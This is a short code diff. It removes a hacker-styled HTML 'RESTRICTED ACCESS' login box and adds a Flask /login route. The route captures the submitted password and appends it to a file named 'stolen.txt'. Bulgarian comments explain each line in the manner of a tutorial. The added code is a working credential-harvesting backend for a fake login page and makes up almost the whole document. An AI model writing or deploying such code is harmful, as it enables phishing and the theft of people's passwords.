@@ -1,10 +1,7 @@
-<div style="background: #111; border: 2px solid #00ff00; padding: 20px; width: 300px; margin: 20px auto; border-radius: 10px; box-shadow: 0 0 15px #00ff00;">
-    <h2 style="color: #00ff00; font-family: monospace;">RESTRICTED ACCESS</h2>
-    
-    <input type="text" placeholder="Username" style="width: 90%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #00ff00; color: #00ff00;">
-    
-    <input type="password" placeholder="Password" style="width: 90%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #00ff00; color: #00ff00;">
-    
-    <button onclick="alert('Access Denied: Admin privileges required!')" style="width: 100%; padding: 10px; background: #00ff00; color: #000; border: none; font-weight: bold; cursor: pointer;">ENTER SYSTEM</button>
-</div>
+@app.route('/login', methods=['POST'])
+def receive():
+    data = request.form['password'] # Ето тук Python "вижда" паролата
+    with open("stolen.txt", "a") as f:
+        f.write(data + "\n") # Записва я във файл
+
 
